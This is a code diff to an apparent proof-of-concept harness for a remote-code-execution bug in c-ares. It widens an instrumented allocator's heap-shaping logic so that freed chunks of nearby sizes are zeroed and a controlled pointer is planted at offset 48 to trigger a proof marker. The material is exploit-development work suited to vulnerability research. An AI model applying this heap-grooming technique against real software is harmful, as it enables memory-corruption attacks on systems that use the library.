@@ -60,6 +60,17 @@ static size_t alloc_seq;
 static proof_slist_t *proof_list;
 static proof_slist_node_t *proof_node;
 
+static int should_shape_size(size_t size)
+{
+  if (size == 144) {
+    return 1;
+  }
+  if (!control_call) {
+    return 0;
+  }
+  return size >= 128 && size <= 192 && (size % sizeof(void *)) == 0;
+}
+
 static void proof_marker(void *arg)
 {
   const char msg[] = "CARES_RCE_PAYLOAD_TRIGGERED\n";
@@ -114,8 +125,9 @@ static void *tracked_malloc(size_t size)
   hdr->magic = 0xc0decafef00dbeefu;
   hdr->next = NULL;
   memset(hdr + 1, 0x55, size);
-  if (trace_allocator && size == 144) {
-    fprintf(stderr, "ALLOC%zu size144 %p\n", ++alloc_seq, (void *)(hdr + 1));
+  if (trace_allocator && should_shape_size(size)) {
+    fprintf(stderr, "ALLOC%zu size%zu %p\n", ++alloc_seq, size,
+            (void *)(hdr + 1));
   }
   return hdr + 1;
 }
@@ -149,10 +161,10 @@ static void tracked_free(void *ptr)
   if (hdr->magic != 0xc0decafef00dbeefu) {
     abort();
   }
-  if (trace_allocator && hdr->size == 144) {
-    fprintf(stderr, "FREE size144 %p\n", ptr);
+  if (trace_allocator && should_shape_size(hdr->size)) {
+    fprintf(stderr, "FREE size%zu %p\n", hdr->size, ptr);
   }
-  if (control_call && hdr->size == 144) {
+  if (control_call && should_shape_size(hdr->size)) {
     ensure_proof_node();
     memset(ptr, 0, hdr->size);
     memcpy((unsigned char *)ptr + 48, &proof_node, sizeof(proof_node));
